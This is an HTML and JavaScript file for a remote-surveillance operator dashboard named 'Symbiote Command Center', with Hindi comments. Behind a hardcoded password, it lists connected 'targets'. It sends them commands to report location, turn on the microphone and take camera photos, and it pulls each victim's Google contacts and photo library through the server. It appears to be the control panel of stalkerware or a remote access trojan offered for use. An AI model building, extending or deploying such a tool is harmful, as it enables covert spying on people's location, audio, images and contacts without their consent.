<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Symbiote Command Center</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    
    <style>
        /* CSS में कोई बदलाव नहीं, यह पहले जैसा ही एडवांस है */
        :root {
            --bg-darker: #111827; --bg-dark: #1f2937; --bg-light: #374151;
            --primary-color: #3b82f6; --primary-hover: #2563eb;
            --text-light: #f9fafb; --text-secondary: #d1d5db; --border-color: #4b5563;
            --success-color: #22c55e; --error-color: #ef4444;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: var(--bg-darker); color: var(--text-light); font-size: 16px; overflow: hidden; }
        #login-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)); display: flex; justify-content: center; align-items: center; z-index: 100; backdrop-filter: blur(5px); }
        .login-box { background-color: var(--bg-light); padding: 40px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; border: 1px solid var(--border-color); animation: fadeIn 0.5s ease; }
        .login-box h2 { margin-bottom: 20px; }
        .login-box input { width: 100%; padding: 12px; margin-bottom: 20px; background-color: var(--bg-dark); border: 1px solid var(--border-color); border-radius: 5px; color: var(--text-light); font-size: 1em; }
        .login-box button { width: 100%; padding: 12px; background-color: var(--primary-color); border: none; border-radius: 5px; color: white; font-size: 1.1em; font-weight: bold; cursor: pointer; transition: background-color 0.2s; }
        .login-box button:hover { background-color: var(--primary-hover); }
        #login-error { color: var(--error-color); margin-top: 15px; display: none; }
        .hidden { display: none !important; }
        .dashboard-grid { display: grid; grid-template-columns: 350px 1fr; height: 100vh; }
        .sidebar { background-color: var(--bg-dark); padding: 20px; border-right: 1px solid var(--border-color); display: flex; flex-direction: column; }
        .main-content { padding: 20px; gap: 20px; overflow-y: auto; }
        .header { text-align: center; padding-bottom: 15px; border-bottom: 1px solid var(--border-color); margin-bottom: 15px; }
        .header h1 { font-size: 1.5em; }
        .card { background-color: var(--bg-light); padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        .card h3 { margin-bottom: 15px; color: var(--text-secondary); font-size: 1.1em; display: flex; align-items: center; }
        .card h3 i { margin-right: 10px; }
        #user-list-container { flex-grow: 1; overflow-y: auto; }
        .user-item { display: flex; align-items: center; padding: 15px; border-radius: 6px; cursor: pointer; transition: background-color 0.2s; border: 1px solid transparent; }
        .user-item:hover { background-color: var(--border-color); }
        .user-item.selected { background-color: var(--primary-color); border-color: var(--primary-hover); }
        .user-item img { width: 40px; height: 40px; border-radius: 50%; margin-right: 15px; }
        .user-info .name { font-weight: bold; }
        .user-info .email { font-size: 0.8em; color: var(--text-secondary); }
        .command-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .command-btn { width: 100%; padding: 12px; font-size: 1em; background-color: var(--primary-color); color: white; border: none; border-radius: 5px; cursor: pointer; text-align: left; transition: all 0.2s; display: flex; align-items: center; }
        .command-btn:hover { background-color: var(--primary-hover); }
        .command-btn:disabled { background-color: var(--border-color); cursor: not-allowed; opacity: 0.6; }
        .command-btn i { margin-right: 10px; width: 20px; text-align: center; }
        #data-display { display: flex; flex-direction: column; gap: 15px; height: calc(100vh - 340px); overflow-y: auto; padding: 10px; background-color: var(--bg-dark); border-radius: 8px;}
        .data-item { background-color: var(--bg-light); border: 1px solid var(--border-color); border-radius: 8px; padding: 15px; animation: fadeIn 0.5s ease; }
        .data-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; color: var(--text-secondary); }
        .data-header .type { font-weight: bold; color: var(--text-light); font-size: 1.1em; display: flex; align-items: center;}
        .data-body { font-family: 'Courier New', Courier, monospace; word-wrap: break-word; background-color: var(--bg-dark); padding: 10px; border-radius: 5px; max-height: 300px; overflow-y: auto;}
        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; }
        .photo-grid img { width: 100%; height: 100px; object-fit: cover; border-radius: 5px; cursor: pointer; transition: transform 0.2s; }
        .photo-grid img:hover { transform: scale(1.05); }
        .contact-list { list-style: none; padding: 0; }
        .contact-list li { padding: 8px; border-bottom: 1px solid var(--border-color); display: flex; flex-direction: column; }
        .contact-list li:last-child { border-bottom: none; }
        .contact-name { font-weight: bold; }
        .contact-detail { font-size: 0.9em; color: var(--text-secondary); }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div id="login-container">
        <div class="login-box">
            <h2><i class="fa-solid fa-shield-virus"></i> Symbiote Access</h2>
            <input type="password" id="password-input" placeholder="Admin Passcode">
            <button id="login-button">Authenticate</button>
            <p id="login-error">Authentication Failed</p>
        </div>
    </div>

    <main id="dashboard" class="dashboard-grid hidden">
        <aside class="sidebar">
            <header><h1><i class="fa-solid fa-users"></i> Connected Users</h1></header>
            <div id="user-list-container"><p id="user-loader" style="text-align: center; padding: 20px;">Loading targets...</p></div>
        </aside>
        
        <div class="main-content">
            <div class="card">
                <h3><i class="fa-solid fa-bullseye"></i> Target & Commands</h3>
                <div id="selected-user-details" style="margin-bottom: 15px;">Please select a target from the list.</div>
                <div class="command-grid">
                    <button id="getLocationBtn" class="command-btn" disabled><i class="fa-solid fa-location-crosshairs"></i>Get Location</button>
                    <button id="startMicBtn" class="command-btn" disabled><i class="fa-solid fa-microphone"></i>Start Microphone</button>
                    <button id="takePhotoFrontBtn" class="command-btn" disabled><i class="fa-solid fa-camera-rotate"></i>Take Photo (Front)</button>
                    <button id="takePhotoBackBtn" class="command-btn" disabled><i class="fa-solid fa-camera"></i>Take Photo (Back)</button>
                    <button id="getContactsBtn" class="command-btn" disabled><i class="fa-solid fa-address-book"></i>Get Contacts</button>
                    <button id="getPhotosBtn" class="command-btn" disabled><i class="fa-solid fa-images"></i>List Photos</button>
                </div>
            </div>
            
            <div id="data-display-container" style="display: flex; flex-direction: column; flex-grow: 1;">
                <h3><i class="fa-solid fa-satellite-dish"></i> Live Data Feed</h3>
                <div id="data-display"></div>
            </div>
        </div>
    </main>

    <script>
        const ADMIN_PASSWORD = "himanshu@123";

        const loginContainer = document.getElementById('login-container');
        const passwordInput = document.getElementById('password-input');
        const loginButton = document.getElementById('login-button');
        const dashboard = document.getElementById('dashboard');
        const userListDiv = document.getElementById('user-list-container');
        const userLoader = document.getElementById('user-loader');
        const dataDisplay = document.getElementById('data-display');
        const selectedUserDetailsDiv = document.getElementById('selected-user-details');
        const commandButtons = document.querySelectorAll('.command-btn');

        let selectedUserId = null;

        loginButton.addEventListener('click', () => {
            if (passwordInput.value === ADMIN_PASSWORD) {
                loginContainer.classList.add('hidden');
                dashboard.classList.remove('hidden');
                fetchUsers();
            } else {
                document.getElementById('login-error').style.display = 'block';
            }
        });
        
        async function fetchUsers() {
            try {
                const response = await fetch('/get-users');
                const users = await response.json();
                userLoader.classList.add('hidden');
                userListDiv.innerHTML = '';
                users.forEach(user => {
                    const userDiv = document.createElement('div');
                    userDiv.className = 'user-item';
                    userDiv.dataset.userId = user.uid;
                    userDiv.innerHTML = `<img src="${user.photoURL}" alt="DP"><div class="user-info"><div class="name">${user.displayName}</div><div class="email">${user.email}</div></div>`;
                    userDiv.addEventListener('click', () => selectUser(user));
                    userListDiv.appendChild(userDiv);
                });
            } catch (error) { userLoader.textContent = "Failed to load targets."; }
        }
        
        function selectUser(user) {
            selectedUserId = user.uid;
            document.querySelectorAll('.user-item').forEach(item => item.classList.remove('selected'));
            document.querySelector(`[data-user-id="${user.uid}"]`).classList.add('selected');
            selectedUserDetailsDiv.innerHTML = `<b>Selected Target:</b> ${user.displayName}`;
            commandButtons.forEach(btn => btn.disabled = false);
        }

        // ===============================================
        // === बदलाव यहाँ है: कमांड भेजने का नया, स्मार्ट तरीका ===
        // ===============================================

        // 1. डिवाइस कमांड्स (जो sw.js को भेजे जाते हैं)
        async function sendDeviceCommand(commandObject) {
            if (!selectedUserId) { alert('Please select a user first!'); return; }
            displayLog('info', `Sending device command: ${commandObject.command}...`);
            try {
                await fetch('/send-command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ userId: selectedUserId, command: commandObject })
                });
            } catch (error) { displayLog('error', 'Network error while sending command.'); }
        }

        // 2. सर्वर कमांड्स (जो सीधे सर्वर से गूगल का डेटा लाते हैं)
        async function fetchGoogleData(dataType) {
            if (!selectedUserId) { alert('Please select a user first!'); return; }
            displayLog('info', `Requesting ${dataType} from server...`);
            try {
                const response = await fetch(`/get-${dataType}/${selectedUserId}`);
                const data = await response.json();
                if (response.ok) {
                    displayData(dataType, data);
                } else {
                    displayLog('error', `Failed to get ${dataType}: ${data.error}`);
                }
            } catch (error) {
                displayLog('error', `Network error while fetching ${dataType}.`);
            }
        }

        function displayData(type, data) {
            const itemCard = document.createElement('div');
            itemCard.className = 'data-item';
            let iconClass = 'fa-solid fa-database';
            let bodyContent = '';

            if (type === 'contacts' && data.length > 0) {
                iconClass = 'fa-solid fa-address-book';
                let listItems = data.map(contact => {
                    const name = contact.names && contact.names.length > 0 ? contact.names[0].displayName : 'N/A';
                    const email = contact.emailAddresses && contact.emailAddresses.length > 0 ? contact.emailAddresses[0].value : 'N/A';
                    return `<li><span class="contact-name">${name}</span><span class="contact-detail">${email}</span></li>`;
                }).join('');
                bodyContent = `<ul class="contact-list">${listItems}</ul>`;
            } else if (type === 'photos' && data.length > 0) {
                iconClass = 'fa-solid fa-images';
                let images = data.map(photo => `<a href="${photo.baseUrl}" target="_blank"><img src="${photo.baseUrl}=w100-h100" title="${photo.filename}"></a>`).join('');
                bodyContent = `<div class="photo-grid">${images}</div>`;
            } else {
                bodyContent = 'No data found or data is empty.';
            }

            itemCard.innerHTML = `
                <div class="data-header">
                    <span class="type"><i class="${iconClass}" style="margin-right: 10px;"></i> ${type.toUpperCase()}</span>
                    <span class="timestamp"><i class="fa-regular fa-clock" style="margin-right: 5px;"></i> ${new Date().toLocaleString()}</span>
                </div>
                <div class="data-body">${bodyContent}</div>`;
            dataDisplay.prepend(itemCard);
        }

        function displayLog(type, message) { /* ... अपरिवर्तित ... */ }

        document.getElementById('getLocationBtn').addEventListener('click', () => sendDeviceCommand({ command: 'get_location' }));
        document.getElementById('startMicBtn').addEventListener('click', () => sendDeviceCommand({ command: 'start_mic' }));
        document.getElementById('getContactsBtn').addEventListener('click', () => fetchGoogleData('contacts'));
        document.getElementById('getPhotosBtn').addEventListener('click', () => fetchGoogleData('photos'));

    </script>
</body>
</html>
